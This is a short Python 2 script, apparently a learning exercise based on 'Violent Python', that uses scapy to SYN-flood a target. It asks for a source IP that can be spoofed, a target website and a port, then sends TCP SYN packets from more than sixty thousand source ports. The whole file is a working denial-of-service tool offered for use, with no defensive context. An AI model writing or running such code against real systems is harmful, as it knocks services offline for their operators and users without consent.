#!/usr/bin/env python2
# written by Moses Arocha
# Created with the help of TJ O'Connor "Violent Python"

import socket
from scapy.all import *

def SynAttack(Source, Target, DestinationPort): 
    for sport in range(1024, 65535):				# Continues to send packets 64,511 times
        IPlayer = IP(src=Source, dst=Target)			 
	TCPlayer = TCP(sport=sport, dport=DestinationPort)	# The destination port of attack is defined by the user, required!
	packet = IPlayer / TCPlayer
	send(packet)				

Source = raw_input("\n\n\t What is the Source IP Address : ")
Target = raw_input("\n\n\t What is the Website Wished To Attack? http://") 
socket.gethostbyname(Target)					# Allows the intergretion of a NS lookup, so users can insert websites.
DestinationPort = int(raw_input("\n\n\t What Port Would You Like To Attack Through? : ")) 

if not os.geteuid() == 0:
    sys.exit('Must Be Root!')
SynAttack(Source, Target, DestinationPort) # References the SynAttack function, must be placed last so all error handling can occur.
